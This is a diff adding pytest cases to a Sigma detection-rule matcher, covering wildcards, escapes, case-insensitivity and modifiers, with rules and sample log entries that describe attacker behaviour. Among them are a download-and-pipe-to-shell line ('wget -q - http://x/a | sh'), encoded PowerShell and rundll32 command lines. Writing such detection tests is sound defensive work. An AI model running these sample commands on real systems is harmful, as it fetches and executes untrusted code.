@@ -7,7 +7,7 @@ import pytest
 import yaml
 
 from recongraph.recongraph import (EdgeGraph, SigmaLabel, SigmaMatcher, SigmaRulesLoader, UnsupportedModifierError,
-                                   _base64offset, _windash)
+                                   _base64offset, _windash, sigma_compare)
 from tests.conftest import SIGMA_RULES
 
 FIXTURES = Path(__file__).parent / "fixtures"
@@ -112,6 +112,78 @@ def test_regex_pattern_is_not_lowercased(tmp_path):
     rule = _rule(tmp_path, {"CommandLine|re": r"^\S+$"})  # lowercasing would turn \S into \s
     assert rule.match(_entry(CommandLine="whoami")) is True
     assert rule.match(_entry(CommandLine="whoami /all")) is False
+
+
+# --- Sigma string values: wildcards and escapes ---
+
+CMD = r"C:\Windows\System32\cmd.exe"
+
+
+# The value of each rule as written in the rule file, and whether it matched Image C:\Windows\System32\cmd.exe of the
+# Sysmon EventID 1 in psexec.evtx (EVTX-ATTACK-SAMPLES LM_sysmon_psexec_smb_meterpreter) when run by Hayabusa 4.3.1.
+@pytest.mark.parametrize("modifier, value, hayabusa", [
+    ("", r"C:\Windows\System32\cmd.exe", True),             # a backslash before a letter is a backslash
+    ("", r"C:\\Windows\\System32\\cmd.exe", True),          # \\ is one backslash
+    ("", r"C:\\\\Windows\\\\System32\\\\cmd.exe", False),   # \\\\ is two backslashes
+    ("|endswith", r"\\\cmd.exe", False),                    # \\\ is two backslashes
+    ("|endswith", r"\\cmd.exe", True),
+    ("", r"C:\Windows\*\cmd.exe", False),                   # \* is a literal asterisk
+    ("", r"C:\Windows\System32\cmd.ex?", True),             # ? is one character
+    ("", r"C:\Windows\System32\cmd.ex\?", False),           # \? is a literal question mark
+    ("", r"c:\WINDOWS\system32\CMD.EXE", True),             # case-insensitive
+    ("|contains", r"Windows\\*\\cmd", True),                # \\* is a backslash, then the * wildcard
+    ("", r"C:\Windows\\*\cmd.exe", True),
+    ("|contains", r"Windows\\\*", False),                   # \\\* is a backslash, then a literal asterisk
+])
+def test_sigma_string_matches_hayabusa(tmp_path, modifier, value, hayabusa):
+    rule = _rule(tmp_path, {f"Image{modifier}": value})
+    assert rule.match(_entry(Image=CMD)) is hayabusa
+
+
+@pytest.mark.parametrize("pattern, value, mode, expected", [
+    ("prog?.exe", "proga.exe", "equals", True),              # examples of the Sigma specification
+    ("prog?.exe", "progab.exe", "equals", False),
+    ("antivirus_v*.exe", "antivirus_v21.2.1.exe", "equals", True),
+    ("/etc/*release", "/etc/os-release", "equals", True),
+    ("/etc/*release", "/etc/os-release.bak", "equals", False),
+    ("/home/*/.bashrc", "/home/alice/.bashrc", "equals", True),
+    ("a*b", "xa\nyb", "contains", True),                     # a wildcard spans newlines
+    ("a*", "xa", "startswith", False),
+    ("*.exe", "c:\\x.exe", "startswith", True),
+    ("x*z", "wxyz", "endswith", True),
+    ("x*z", "xyzw", "endswith", False),
+    ("x?z", "axyzb", "contains", True),
+    ("\\*", "a*b", "contains", True),
+    ("\\*", "ab", "contains", False),
+    ("ab\\", "ab\\", "equals", True),                        # a trailing backslash stays
+    ("", "", "equals", True),
+])
+def test_sigma_compare(pattern, value, mode, expected):
+    assert sigma_compare(value, pattern, mode) is expected
+
+
+def test_keyword_wildcard(tmp_path):
+    rule = _rule(tmp_path, ["wget * - http* | sh"], logsource={"product": "linux"})
+    assert rule.match(_entry(("linux",), desc="wget -q - http://x/a | sh")) is True
+    assert rule.match(_entry(("linux",), desc="wget -q http://x/a")) is False
+
+
+def test_contains_all_with_wildcard(tmp_path):
+    rule = _rule(tmp_path, {"CommandLine|contains|all": ["oledb32.dll", "\\\\Users\\\\*\\\\Downloads\\\\"]})
+    assert rule.match(_entry(CommandLine=r"rundll32 oledb32.dll,OpenDSLFile C:\Users\bob\Downloads\a.udl")) is True
+    assert rule.match(_entry(CommandLine=r"rundll32 oledb32.dll,OpenDSLFile C:\Temp\a.udl")) is False
+
+
+def test_windash_variants_keep_wildcards(tmp_path):
+    rule = _rule(tmp_path, {"CommandLine|contains|windash": " -enc *="})
+    assert rule.match(_entry(CommandLine="powershell /enc ZQBj=")) is True
+    assert rule.match(_entry(CommandLine="powershell /enc ZQBj")) is False
+
+
+def test_fieldref_value_is_text_not_a_sigma_string(tmp_path):
+    rule = _rule(tmp_path, {"User|fieldref": "ParentUser"})
+    assert rule.match(_entry(User="a*", ParentUser="a*")) is True
+    assert rule.match(_entry(User="abc", ParentUser="a*")) is False
 
 
 def test_list_of_maps_is_an_or_of_map_selections(tmp_path):
